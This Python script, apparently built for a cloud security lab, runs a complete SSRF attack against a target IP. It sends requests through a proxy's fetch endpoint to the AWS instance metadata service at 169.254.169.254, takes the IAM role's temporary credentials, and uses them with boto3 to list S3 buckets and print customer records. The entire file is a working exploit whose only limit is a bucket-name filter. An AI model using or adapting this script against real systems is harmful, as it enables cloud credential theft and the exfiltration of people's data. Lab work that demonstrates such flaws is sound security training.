import sys
import requests
import json
import boto3

def simulate_attack(target_ip):
    print(f"[*] Initiating SSRF attack against {target_ip}...")
    base_proxy_url = f"http://{target_ip}/fetch?url="
    
    # Step 1: Discover IAM Role Name via IMDSv1
    iam_path = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    print("[*] Step 1: Querying IMDSv1 for attached IAM roles via SSRF...")
    
    try:
        # The proxy on the EC2 instance makes the request on our behalf
        res = requests.get(base_proxy_url + iam_path, timeout=10)
        if res.status_code != 200:
            print("[-] Failed to reach metadata service. Is the target patched?")
            return
            
        role_name = res.text.strip()
        print(f"[+] Role discovered: {role_name}")
        
        # Step 2: Extract Temporary Security Credentials
        print(f"[*] Step 2: Extracting temporary credentials for role '{role_name}'...")
        cred_path = f"{iam_path}{role_name}"
        cred_res = requests.get(base_proxy_url + cred_path, timeout=10)
        
        creds = cred_res.json()
        print("[+] Credentials successfully extracted from the cloud environment!")
        
        # Step 3: Use Stolen Credentials to Breach S3 (The Capital One flaw)
        print("[*] Step 3: Assuming stolen identity to access AWS S3...")
        s3_client = boto3.client(
            's3',
            aws_access_key_id=creds['AccessKeyId'],
            aws_secret_access_key=creds['SecretAccessKey'],
            aws_session_token=creds['Token'],
            region_name='us-east-1' # Default lab region from our Terraform config
        )
        
        # List buckets to find our target vault
        buckets = s3_client.list_buckets()
        target_bucket = None
        for b in buckets['Buckets']:
            if "threat-lab-data-vault" in b['Name']:
                target_bucket = b['Name']
                break
                
        if not target_bucket:
            print("[-] Could not find the target data vault.")
            return
            
        print(f"[+] Found target S3 bucket: {target_bucket}")
        
        # Exfiltrate the sensitive data
        print("[*] Exfiltrating customer data...")
        obj = s3_client.get_object(Bucket=target_bucket, Key="records/customer_data.json")
        data = obj['Body'].read().decode('utf-8')
        
        print("\n--- EXFILTRATED DATA ---")
        print(json.dumps(json.loads(data), indent=4))
        print("------------------------\n")
        print("[+] Simulation Complete. The SSRF vulnerability has been successfully proven.")
        
    except Exception as e:
        print(f"[-] Attack simulation failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python simulate_ssrf.py <TARGET_PUBLIC_IP>")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    simulate_attack(target_ip)